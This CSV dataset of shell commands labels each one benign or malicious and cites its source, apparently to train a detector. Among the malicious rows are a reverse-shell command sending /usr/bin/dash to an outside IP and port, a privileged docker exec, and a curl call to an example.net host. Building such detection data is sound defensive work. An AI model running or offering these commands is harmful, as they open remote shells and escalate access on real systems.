id,command,label,source,split
d1_000000,nl access.old,0,bash_instruct,train
d1_000001,tea open,0,tldr,train
d1_000003,tr 'a-z' 'A-Z' < access.ini,0,bash_instruct,train
d1_000005,fastapi --help,0,tldr,train
d1_000006,"grep -rnw ""pattern""",0,nl2bash,train
d1_000008,cat catalog.yaml | sed 's/[[:space:]]*$//',0,bash_instruct,train
d1_000009,rcat 101.234.208.109 52334 -r /usr/bin/dash,1,quasarnix,train
d1_000011,mkdir -p $(echo -e $1 |sed $'s/\r//'),0,nl2bash,train
d1_000013,docker exec -it --privileged 1a2b3c4d5e6f bash,1,hacktricks,train
d1_000014,cp build.old build.old.bak,0,bash_instruct,train
d1_000016,rustc --explain E0001,1,gtfobins,train
d1_000017,bind -P | grep '\\e\\C-k',0,nl2bash,train
d1_000020,docker inspect [-f|--format] '\{\{range.NetworkSettings.Networks\}\}\{\{.IPAddress\}\}\{\{end\}\}' container,0,tldr,train
d1_000021,vault write secret/hello value=world,0,tldr,train
d1_000022,istats,0,tldr,train
d1_000023,"find ./ -type f -exec grep -l ""Text To Find"" {} \;",0,nl2bash,train
d1_000024,nl filename,0,nl2bash,train
d1_000025,chiaki,0,linlm,train
d1_000026,chown -R root:root /tmp/AtomicRedTeam/atomics/T1222.002,1,atomic_red_team,train
d1_000027,tor-browser,0,linlm,train
d1_000030,./backup.sh > auth.log 2>&1,0,bash_instruct,train
d1_000031,sed '/^$/d' catalog.log,0,bash_instruct,train
d1_000033,"Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap",1,hacktricks,train
d1_000034,cd $HOME,1,atomic_red_team,train
d1_000035,find / -nouser -o -nogroup,0,nl2bash,train
d1_000036,curl http://hbaea954b.example.net,1,atomic_red_team,train
d1_000037,dockerd [-H|--host] unix://path/to/tmp.sock [-H|--host] tcp://ip_address,0,tldr,train
d1_000038,cp -p changelog.css public/,0,bash_instruct,train
